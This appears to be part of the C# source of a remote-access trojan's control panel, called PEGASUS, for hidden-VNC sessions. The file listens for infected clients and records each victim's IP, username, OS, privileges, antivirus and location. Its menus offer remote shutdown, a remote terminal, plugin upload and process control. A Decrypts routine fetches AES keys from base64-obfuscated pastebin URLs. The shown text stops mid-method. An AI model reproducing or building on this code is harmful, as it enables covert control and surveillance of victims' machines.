using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.AnimatorNS;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using PEGASUS.Connection;
using PEGASUS.Forms;
using PEGASUS.Helper;
using PEGASUS.Messages;
using PEGASUS.Properties;
using PEGASUS.Tools;
using PEGASUS.Tools.Algorithm;
using PEGASUS.Tools.Helpers;
using PEGASUS.Tools.Networking;
using Siticone.UI.WinForms;
using Sockets;

namespace PEGASUS
{ 

public class RhVNC_Connections : Form
{
	public class ColorConfig
	{
		private Color _fontcolor = Color.White;

		private Color _marginstartcolor = Color.FromArgb(22, 22, 22);

		private Color _marginendcolor = Color.FromArgb(22, 22, 22);

		private Color _dropdownitembackcolor = Color.FromArgb(22, 22, 22);

		private Color _dropdownitemstartcolor = Color.FromArgb(22, 22, 22);

		private Color _dorpdownitemendcolor = Color.FromArgb(22, 22, 22);

		private Color _menuitemstartcolor = Color.FromArgb(22, 22, 22);

		private Color _menuitemendcolor = Color.FromArgb(22, 22, 22);

		private Color _separatorcolor = Color.FromArgb(22, 22, 22);

		private Color _mainmenubackcolor = Color.FromArgb(22, 22, 22);

		private Color _mainmenustartcolor = Color.FromArgb(22, 22, 22);

		private Color _mainmenuendcolor = Color.FromArgb(22, 22, 22);

		private Color _dropdownborder = Color.FromArgb(22, 22, 22);

		public Color FontColor
		{
			get
			{
				return _fontcolor;
			}
			set
			{
				_fontcolor = value;
			}
		}

		public Color MarginStartColor
		{
			get
			{
				return _marginstartcolor;
			}
			set
			{
				_marginstartcolor = value;
			}
		}

		public Color MarginEndColor
		{
			get
			{
				return _marginendcolor;
			}
			set
			{
				_marginendcolor = value;
			}
		}

		public Color DropDownItemBackColor
		{
			get
			{
				return _dropdownitembackcolor;
			}
			set
			{
				_dropdownitembackcolor = value;
			}
		}

		public Color DropDownItemStartColor
		{
			get
			{
				return _dropdownitemstartcolor;
			}
			set
			{
				_dropdownitemstartcolor = value;
			}
		}

		public Color DropDownItemEndColor
		{
			get
			{
				return _dorpdownitemendcolor;
			}
			set
			{
				_dorpdownitemendcolor = value;
			}
		}

		public Color MenuItemStartColor
		{
			get
			{
				return _menuitemstartcolor;
			}
			set
			{
				_menuitemstartcolor = value;
			}
		}

		public Color MenuItemEndColor
		{
			get
			{
				return _menuitemendcolor;
			}
			set
			{
				_menuitemendcolor = value;
			}
		}

		public Color SeparatorColor
		{
			get
			{
				return _separatorcolor;
			}
			set
			{
				_separatorcolor = value;
			}
		}

		public Color MainMenuBackColor
		{
			get
			{
				return _mainmenubackcolor;
			}
			set
			{
				_mainmenubackcolor = value;
			}
		}

		public Color MainMenuStartColor
		{
			get
			{
				return _mainmenustartcolor;
			}
			set
			{
				_mainmenustartcolor = value;
			}
		}

		public Color MainMenuEndColor
		{
			get
			{
				return _mainmenuendcolor;
			}
			set
			{
				_mainmenuendcolor = value;
			}
		}

		public Color DropDownBorder
		{
			get
			{
				return _dropdownborder;
			}
			set
			{
				_dropdownborder = value;
			}
		}
	}

	public class MyMenuRender : ToolStripProfessionalRenderer
	{
		private ColorConfig colorconfig = new ColorConfig();

		protected override void OnRenderToolStripBackground(ToolStripRenderEventArgs e)
		{
			e.ToolStrip.ForeColor = colorconfig.FontColor;
			if (e.ToolStrip is ToolStripDropDown)
			{
				using (SolidBrush brush = new SolidBrush(Color.FromArgb(30, 30, 30)))
				{
					e.Graphics.FillRectangle(brush, e.AffectedBounds);
					return;
				}
			}
			if (e.ToolStrip is MenuStrip)
			{
				Blend blend = new Blend();
				float[] positions = new float[5] { 0f, 0.3f, 0.5f, 0.8f, 1f };
				float[] factors = new float[5] { 0f, 0.5f, 0.9f, 0.5f, 0f };
				blend.Positions = positions;
				blend.Factors = factors;
				FillLineGradient(e.Graphics, e.AffectedBounds, colorconfig.MainMenuStartColor, colorconfig.MainMenuEndColor, 90f, blend);
			}
			else
			{
				base.OnRenderToolStripBackground(e);
			}
		}

		protected override void OnRenderImageMargin(ToolStripRenderEventArgs e)
		{
			FillLineGradient(e.Graphics, e.AffectedBounds, Color.FromArgb(30, 30, 30), Color.FromArgb(30, 30, 30), 0f, null);
		}

		protected override void OnRenderMenuItemBackground(ToolStripItemRenderEventArgs e)
		{
			if (e.ToolStrip is MenuStrip)
			{
				if (e.Item.Selected || e.Item.Pressed)
				{
					Blend blend = new Blend();
					float[] positions = new float[5] { 0f, 0.3f, 0.5f, 0.8f, 1f };
					float[] factors = new float[5] { 0f, 0.5f, 1f, 0.5f, 0f };
					blend.Positions = positions;
					blend.Factors = factors;
					FillLineGradient(e.Graphics, new Rectangle(0, 0, e.Item.Size.Width, e.Item.Size.Height), Color.FromArgb(30, 30, 30), Color.FromArgb(30, 30, 30), 90f, blend);
				}
				else
				{
					base.OnRenderMenuItemBackground(e);
				}
			}
			else if (e.ToolStrip is ToolStripDropDown)
			{
				if (e.Item.Selected)
				{
					FillLineGradient(e.Graphics, new Rectangle(0, 0, e.Item.Size.Width, e.Item.Size.Height), colorconfig.DropDownItemStartColor, colorconfig.DropDownItemEndColor, 90f, null);
				}
			}
			else
			{
				base.OnRenderMenuItemBackground(e);
			}
		}

		protected override void OnRenderSeparator(ToolStripSeparatorRenderEventArgs e)
		{
			using Pen pen = new Pen(colorconfig.DropDownBorder);
			e.Graphics.DrawLine(pen, 0, 2, e.Item.Width, 2);
		}

		protected override void OnRenderToolStripBorder(ToolStripRenderEventArgs e)
		{
			if (e.ToolStrip is ToolStripDropDown)
			{
				using (Pen pen = new Pen(colorconfig.DropDownBorder))
				{
					Graphics graphics = e.Graphics;
					Pen pen2 = pen;
					int width = e.AffectedBounds.Width - 1;
					int height = e.AffectedBounds.Height - 1;
					Rectangle rect = new Rectangle(0, 0, width, height);
					graphics.DrawRectangle(pen2, rect);
					return;
				}
			}
			base.OnRenderToolStripBorder(e);
		}

		protected override void OnRenderArrow(ToolStripArrowRenderEventArgs e)
		{
			e.ArrowColor = Color.Red;
			base.OnRenderArrow(e);
		}

		private void FillLineGradient(Graphics g, Rectangle rect, Color startcolor, Color endcolor, float angle, Blend blend)
		{
			using LinearGradientBrush linearGradientBrush = new LinearGradientBrush(rect, startcolor, endcolor, angle);
			if (blend != null)
			{
				linearGradientBrush.Blend = blend;
			}
			using GraphicsPath graphicsPath = new GraphicsPath();
			graphicsPath.AddRectangle(rect);
			g.SmoothingMode = SmoothingMode.AntiAlias;
			g.FillPath(linearGradientBrush, graphicsPath);
		}
	}

	public TcpServer _tcpServer;

	private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();

	private readonly object _processingClientConnectionsLock = new object();

	private readonly object _lockClients = new object();

	private object _Messobjlock = new object();

	public object PluginStatus = new object();

	private IContainer components;

	private Guna2BorderlessForm guna2BorderlessForm1;

	private Guna2ControlBox guna2ControlBox3;

	private Guna2ControlBox guna2ControlBox2;

	private Guna2ControlBox guna2ControlBox1;

	private Guna2Button guna2Button1;

	private Guna2PictureBox guna2PictureBox1;

	private ListView listView1;

	private ColumnHeader columnHeader1;

	private ColumnHeader columnHeader2;

	private ColumnHeader columnHeader3;

	private ColumnHeader columnHeader4;

	private ColumnHeader columnHeader5;

	private ColumnHeader columnHeader6;

	private ColumnHeader columnHeader7;

	private ColumnHeader columnHeader8;

	private ColumnHeader columnHeader9;

	private Guna2Panel buttonspanel;

	private Guna2NumericUpDown numPort;

	private Guna2GradientButton btnStopL;

	private Guna2GradientButton btnStartL;

	private ListView listView2;

	private ColumnHeader colDateTime;

	private ColumnHeader colEven;

	private Guna2ContextMenuStrip guna2ContextMenuStrip2;

	private ToolStripMenuItem hVNCHBROWSERSToolStripMenuItem;

	private ToolStripMenuItem startToolStripMenuItem;

	private ToolStripMenuItem stopToolStripMenuItem;

	private Guna2Transition guna2Transition1;

	public NotifyIcon notifyIcon;

	private ImageList imageList1;

	private System.Windows.Forms.Timer timer1;

	private System.Windows.Forms.Timer timer2;

	private ImageList imageList2;

	private SiticoneLabel lblOnline;

	private SiticoneLabel lblDownload;

	private SiticoneLabel lblUpload;

	private Guna2ShadowForm guna2ShadowForm1;

	private SiticoneOSToggleSwith chkSubitemIcons;

	private SiticoneLabel siticoneLabel1;

	private Label label1;

	public PEGASUSMain F { get; set; }

	internal Clients Client { get; set; }

	internal Clients ParentClient { get; set; }

	[DllImport("user32.DLL")]
	private static extern void ReleaseCapture();

	[DllImport("user32.DLL")]
	private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

	private void siticoneGradientPanel1_MouseDown(object sender, MouseEventArgs e)
	{
		ReleaseCapture();
		SendMessage(base.Handle, 274, 61458, 0);
	}

	public RhVNC_Connections()
	{
		InitializeComponent();
	}

	private void SetLastColumnWidth1()
	{
		listView1.Columns[listView1.Columns.Count - 1].Width = -2;
	}

	private void SetLastColumnWidth2()
	{
		listView2.Columns[listView2.Columns.Count - 1].Width = -2;
	}

	private void HVNC_Handler_FormClosed(object sender, FormClosedEventArgs e)
	{
		notifyIcon.Dispose();
		Close();
	}

	private void RhVNC_Connections_Load(object sender, EventArgs e)
	{
		listView1.SmallImageList = imageList2;
		ListviewDoubleBuffer.Enable(listView1);
		listView1.MakeColumnHeaders("[IP Address]", 150, HorizontalAlignment.Left, "[Computer/Username]", 180, HorizontalAlignment.Left, "[Operating System]", 150, HorizontalAlignment.Left, "[Started Payload]", 150, HorizontalAlignment.Left, "[Installed Payload]", 150, HorizontalAlignment.Right, "[Privileges]", 100, HorizontalAlignment.Right, "[Windows AV]", 150, HorizontalAlignment.Left, "[.NetFramework]", 150, HorizontalAlignment.Right, "[Geo Location]", 150, HorizontalAlignment.Right);
		chkSubitemIcons.Checked = true;
		listView1.ShowSubItemIcons(chkSubitemIcons.Checked);
		SetLastColumnWidth1();
		listView1.Layout += delegate
		{
			SetLastColumnWidth1();
		};
		listView1.View = View.Details;
		listView1.HideSelection = false;
		listView1.OwnerDraw = true;
		listView1.GridLines = false;
		listView1.BackColor = Color.FromArgb(24, 24, 24);
		listView1.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
		{
			Brush brush2 = new SolidBrush(Color.FromArgb(30, 30, 30));
			args.Graphics.FillRectangle(brush2, args.Bounds);
			TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
		};
		listView1.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
		{
			args.DrawDefault = true;
		};
		listView1.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
		{
			args.DrawDefault = true;
		};
		listView2.Layout += delegate
		{
			SetLastColumnWidth2();
		};
		listView2.View = View.Details;
		listView2.HideSelection = false;
		listView2.OwnerDraw = true;
		listView2.BackColor = Color.FromArgb(24, 24, 24);
		listView2.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
		{
			Brush brush = new SolidBrush(Color.FromArgb(30, 30, 30));
			args.Graphics.FillRectangle(brush, args.Bounds);
			TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
		};
		listView2.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
		{
			args.DrawDefault = true;
		};
		listView2.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
		{
			args.DrawDefault = true;
		};
		_tcpServer = new TcpServer(Convert.ToInt32(PEGASUS.Properties.Settings.Default.hPort));
		_tcpServer._ClientConnected += ClientConnected;
		_tcpServer._ClientDisconnected += ClientDisconnected;
		_tcpServer._ClientMessage += ClientMessage;
		_tcpServer.Listen();
		Task.Factory.StartNew((Func<Task>)async delegate
		{
			await UpdateStatusBar();
		}, TaskCreationOptions.LongRunning);
	}

	private void PrintMessage(RichTextBox box, string message, Color color)
	{
	}

	public void AddNewItemToListBox(string text)
	{
		for (int i = 0; i <= listView2.Items.Count - 1; i++)
		{
			listView2.Items[i].ForeColor = Color.White;
		}
		listView2.SmallImageList = imageList2;
		ListViewItem listViewItem = new ListViewItem();
		listViewItem.Text = text;
		listViewItem.ForeColor = Color.FromArgb(0, 250, 154);
		listView2.Items.Add(listViewItem);
	}

	public void ClientConnected(object sender, EventArgs m)
	{
		try
		{
			listView1.SmallImageList = imageList1;
			ListViewItem lvi = new ListViewItem();
			TcpClientSession tcpClientSession = (TcpClientSession)sender;
			tcpClientSession._cif._FormExecute = UpdateClientInfo;
			lvi.ImageIndex = 0;
			lvi.Name = tcpClientSession._sessionKey;
			lvi.Text = tcpClientSession._remoteEndPoint.Address.ToString();
			ClientMessage(lvi.Text + "  ....New Client Connected!!!", null);
			Invoke((MethodInvoker)delegate
			{
				lock (_lockClients)
				{
					lblOnline.Text = "Online:[ " + _tcpServer._sessions.Count + " ]";
					listView1.Items.Add(lvi);
				}
			});
		}
		catch (Exception ex)
		{
			MsgBox.Show(ex.Message + "ClientConnected");
		}
	}

	public void ClientDisconnected(object sender, EventArgs m)
	{
		try
		{
			TcpClientSession _s = (TcpClientSession)sender;
			ClientMessage(_s._remoteEndPoint.Address.ToString() + "  ....Client Disconnected!!!", null);
			Invoke((MethodInvoker)delegate
			{
				lock (_lockClients)
				{
					foreach (ListViewItem item in listView1.Items)
					{
						if (item.SubItems[0].Name.Equals(_s._sessionKey))
						{
							listView1.Items.Remove(item);
						}
						lblOnline.Text = "Online:[ " + _tcpServer._sessions.Count + " ]";
					}
				}
			});
		}
		catch (Exception ex)
		{
			MsgBox.Show(ex.Message + "ClientDisconnected");
		}
	}

	public void ClientMessage(object sender, EventArgs m)
	{
		try
		{
			listView2.SmallImageList = imageList2;
			ListViewItem lvi = new ListViewItem();
			for (int i = 0; i <= listView2.Items.Count - 1; i++)
			{
				listView2.Items[i].ForeColor = Color.White;
			}
			lvi.ImageIndex = 11;
			lvi.Text = "[ * ]  " + DateTime.Now.ToString();
			lvi.SubItems.Add((string)sender);
			Invoke((MethodInvoker)delegate
			{
				lock (_Messobjlock)
				{
					for (int j = 0; j <= listView2.Items.Count - 1; j++)
					{
						listView2.Items[j].ForeColor = Color.WhiteSmoke;
					}
					listView2.Items.Add(lvi);
					listView2.Items[listView2.Items.Count - 1].EnsureVisible();
				}
			});
		}
		catch (Exception ex)
		{
			MsgBox.Show(ex.Message + "ClientMessage");
		}
	}

	private void AddClientToListview(Client client)
	{
		if (client == null)
		{
			return;
		}
		try
		{
			ListViewItem lvi = new ListViewItem(new string[9]
			{
				" " + client.EndPoint.Address,
				client.Value.UserAtPc,
				client.Value.OperatingSystem,
				"Connected",
				client.Value.Tag,
				"Active",
				client.Value.AccountType,
				client.Value.Version,
				client.Value.CountryWithCode
			})
			{
				Tag = client,
				ImageIndex = client.Value.ImageIndex
			};
			Invoke((MethodInvoker)delegate
			{
				lock (_lockClients)
				{
					listView1.Items.Add(lvi);
				}
			});
		}
		catch (InvalidOperationException)
		{
		}
	}

	private void RemoveClientFromListview(Client client)
	{
		if (client == null)
		{
			return;
		}
		try
		{
			Invoke((MethodInvoker)delegate
			{
				lock (_lockClients)
				{
					using IEnumerator<ListViewItem> enumerator = (from ListViewItem lvi in listView1.Items
						where lvi != null && client.Equals(lvi.Tag)
						select lvi).GetEnumerator();
					if (enumerator.MoveNext())
					{
						enumerator.Current.Remove();
					}
				}
			});
		}
		catch (InvalidOperationException)
		{
		}
	}

	public void UpdateClientInfo(TcpClientSession tcs, GetCilentInfo gci)
	{
		try
		{
			Invoke((MethodInvoker)delegate
			{
				lock (_lockClients)
				{
					listView1.BeginUpdate();
					foreach (ListViewItem item in listView1.Items)
					{
						if (item.SubItems[0].Name.Equals(tcs._sessionKey))
						{
							item.SubItems.AddRange(new string[8] { gci._MachineName, gci._OperatingSystem, gci._StatrTime, gci._Install, gci._Privileges, gci._Anti_virus, gci._net, gci._Country });
						}
					}
					listView1.EndUpdate();
				}
			});
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message + "UpdateClientInfo");
		}
	}

	public async Task UpdateStatusBar()
	{
		while (true)
		{
			await Task.Delay(1000);
			int sendBytes = _tcpServer.SendBytes;
			_tcpServer.SendBytes = 0;
			lblUpload.Text = "Upload:[" + ((sendBytes < 1024) ? (sendBytes + " Bytes]") : (sendBytes / 1024 + " KB]"));
			int recvBytes = _tcpServer.RecvBytes;
			_tcpServer.RecvBytes = 0;
			lblDownload.Text = "Download:[" + ((recvBytes < 1024) ? (recvBytes + " Bytes]") : (recvBytes / 1024 + " KB]"));
		}
	}

	public static string Decrypts(string encrypted)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		string s = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2luUnRhdFdx")));
		string s2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1p3VDFCZlZk")));
		byte[] array = Convert.FromBase64String(encrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s);
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s2);
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		cryptoTransform.Dispose();
		return Encoding.ASCII.GetString(bytes);
	}

	private bool GetSelectedSession(out TcpClientSession tcs)
	{
		TcpClientSession value = null;
		if (listView1.SelectedItems.Count == 0)
		{
			tcs = null;
			return false;
		}
		if (_tcpServer._sessions.TryGetValue(listView1.SelectedItems[0].Name, out value))
		{
			tcs = value;
			return true;
		}
		tcs = null;
		return false;
	}

	private ListView createNewTabPage()
	{
		ColumnHeader columnHeader = new ColumnHeader();
		ColumnHeader columnHeader2 = new ColumnHeader();
		ColumnHeader columnHeader3 = new ColumnHeader();
		ColumnHeader columnHeader4 = new ColumnHeader();
		ColumnHeader columnHeader5 = new ColumnHeader();
		ColumnHeader columnHeader6 = new ColumnHeader();
		ColumnHeader columnHeader7 = new ColumnHeader();
		ColumnHeader columnHeader8 = new ColumnHeader();
		ColumnHeader columnHeader9 = new ColumnHeader();
		ColumnHeader columnHeader10 = new ColumnHeader();
		ListView listView = new ListView();
		listView.BackColor = Color.FromArgb(0, 250, 154);
		listView.BorderStyle = BorderStyle.None;
		listView.Columns.AddRange(new ColumnHeader[10] { columnHeader, columnHeader2, columnHeader3, columnHeader4, columnHeader5, columnHeader6, columnHeader7, columnHeader8, columnHeader9, columnHeader10 });
		columnHeader.Text = "[IP Address]";
		columnHeader.Width = 100;
		columnHeader2.Text = "[Computer/Username]";
		columnHeader2.Width = 160;
		columnHeader3.Text = "[Computer/Remarks]";
		columnHeader3.Width = 120;
		columnHeader4.Text = "[Operating System]";
		columnHeader4.Width = 200;
		columnHeader5.Text = "[Startup Time]";
		columnHeader5.Width = 150;
		columnHeader6.Text = "[Install Time]";
		columnHeader6.Width = 150;
		columnHeader7.Text = "[Authority]";
		columnHeader7.Width = 80;
		columnHeader8.Text = "[Anti-Virus]";
		columnHeader8.Width = 200;
		columnHeader9.Text = "[.Net Version]";
		columnHeader9.Width = 80;
		columnHeader10.Text = "[Region/Country]";
		columnHeader10.Width = 200;
		listView.ContextMenuStrip = createContextMenu();
		listView.Font = new Font("Gotham Book", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 134);
		listView.ForeColor = Color.FromArgb(190, 190, 190);
		listView.FullRowSelect = true;
		listView.HideSelection = false;
		listView.Location = new Point(2, 2);
		listView.MultiSelect = false;
		listView.Name = "lvClientInfo";
		listView.OwnerDraw = true;
		listView.Size = new Size(1265, 380);
		listView.BorderStyle = BorderStyle.FixedSingle;
		listView.TabIndex = 0;
		listView.UseCompatibleStateImageBehavior = false;
		listView.View = View.Details;
		listView.DrawColumnHeader += ListView1_DrawColumnHeader;
		listView.DrawItem += ListView1_DrawItem;
		listView.DrawSubItem += ListView1_DrawSubItem;
		return listView;
	}

	private ContextMenuStrip createContextMenu()
	{
		ContextMenuStrip contextMenuStrip = new ContextMenuStrip();
		ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem2 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem3 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem4 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem5 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem6 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem7 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem8 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem9 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem10 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem11 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem12 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem13 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem14 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem15 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem16 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem17 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem18 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem19 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem20 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem21 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem22 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem23 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem24 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem25 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem26 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem27 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem28 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem29 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem30 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem31 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem32 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem33 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem34 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem35 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem36 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem37 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem38 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem39 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem40 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem41 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem42 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem43 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem44 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem45 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem46 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem47 = new ToolStripMenuItem();
		ToolStripMenuItem toolStripMenuItem48 = new ToolStripMenuItem();
		contextMenuStrip.BackColor = Color.FromArgb(30, 30, 30);
		contextMenuStrip.Items.AddRange(new ToolStripItem[12]
		{
			toolStripMenuItem, toolStripMenuItem11, toolStripMenuItem17, toolStripMenuItem46, toolStripMenuItem20, toolStripMenuItem23, toolStripMenuItem26, toolStripMenuItem29, toolStripMenuItem32, toolStripMenuItem14,
			toolStripMenuItem35, toolStripMenuItem38
		});
		contextMenuStrip.Name = "contextMenuStrip1";
		contextMenuStrip.Size = new Size(181, 224);
		toolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[8] { toolStripMenuItem2, toolStripMenuItem3, toolStripMenuItem4, toolStripMenuItem6, toolStripMenuItem7, toolStripMenuItem8, toolStripMenuItem9, toolStripMenuItem10 });
		toolStripMenuItem.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem.Name = "toolSystemMessage";
		toolStripMenuItem.Size = new Size(180, 22);
		toolStripMenuItem.Text = "System Message";
		toolStripMenuItem2.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem2.Name = "clientInfoToolStripMenuItem1";
		toolStripMenuItem2.Size = new Size(144, 22);
		toolStripMenuItem2.Text = "Client Information";
		toolStripMenuItem3.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem3.Name = "disConnectToolStripMenuItem";
		toolStripMenuItem3.Size = new Size(144, 22);
		toolStripMenuItem3.Text = "Disconnect";
		toolStripMenuItem4.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem4.Name = "restartToolStripMenuItem";
		toolStripMenuItem4.Size = new Size(144, 22);
		toolStripMenuItem4.Text = "Restart Connection";
		toolStripMenuItem5.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem5.Name = "restartToolStripMenuItem";
		toolStripMenuItem5.Size = new Size(144, 22);
		toolStripMenuItem5.Text = "Web History";
		toolStripMenuItem6.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem6.Name = "远程关机ToolStripMenuItem";
		toolStripMenuItem6.Size = new Size(144, 22);
		toolStripMenuItem6.Text = "Remote Shutdown";
		toolStripMenuItem7.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem7.Name = "远程重启ToolStripMenuItem";
		toolStripMenuItem7.Size = new Size(144, 22);
		toolStripMenuItem7.Text = "Remote Restart";
		toolStripMenuItem8.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem8.Name = "远程注销ToolStripMenuItem";
		toolStripMenuItem8.Size = new Size(144, 22);
		toolStripMenuItem8.Text = "Remote Logout";
		toolStripMenuItem9.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem9.Name = "更新客户端ToolStripMenuItem";
		toolStripMenuItem9.Size = new Size(144, 22);
		toolStripMenuItem9.Text = "Update client";
		toolStripMenuItem10.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem10.Name = "uplugnToolStripMenuItem";
		toolStripMenuItem10.Size = new Size(144, 22);
		toolStripMenuItem10.Text = "Upload plugin";
		toolStripMenuItem11.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem12, toolStripMenuItem13 });
		toolStripMenuItem11.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem11.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem11.Name = "remoteShellToolStripMenuItem";
		toolStripMenuItem11.Size = new Size(180, 22);
		toolStripMenuItem11.Text = "Remote Terminal";
		toolStripMenuItem12.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem12.Name = "remoteShellToolStripMenuItem1";
		toolStripMenuItem12.Size = new Size(130, 22);
		toolStripMenuItem12.Text = "Remote Terminal";
		toolStripMenuItem13.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem13.Name = "pulginToolStripMenuItem";
		toolStripMenuItem13.Size = new Size(130, 22);
		toolStripMenuItem13.Text = "Upload plugin";
		toolStripMenuItem14.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem15, toolStripMenuItem16 });
		toolStripMenuItem14.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem14.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem14.Name = "remoteStartupToolStripMenuItem";
		toolStripMenuItem14.Size = new Size(180, 22);
		toolStripMenuItem14.Text = "Startup Manager";
		toolStripMenuItem15.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem15.Name = "remoteStartupToolStripMenuItem1";
		toolStripMenuItem15.Size = new Size(130, 22);
		toolStripMenuItem15.Text = "Startup Manager";
		toolStripMenuItem16.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem16.Name = "pulginToolStripMenuItem";
		toolStripMenuItem16.Size = new Size(130, 22);
		toolStripMenuItem16.Text = "Upload plugin";
		toolStripMenuItem17.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem18, toolStripMenuItem19 });
		toolStripMenuItem46.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem47, toolStripMenuItem48 });
		toolStripMenuItem17.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem17.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem17.Name = "remoteProcessToolStripMenuItem";
		toolStripMenuItem17.Size = new Size(180, 22);
		toolStripMenuItem17.Text = "Process Management";
		toolStripMenuItem18.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem18.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem18.Name = "remoteProcessToolStripMenuItem2";
		toolStripMenuItem18.Size = new Size(130, 22);
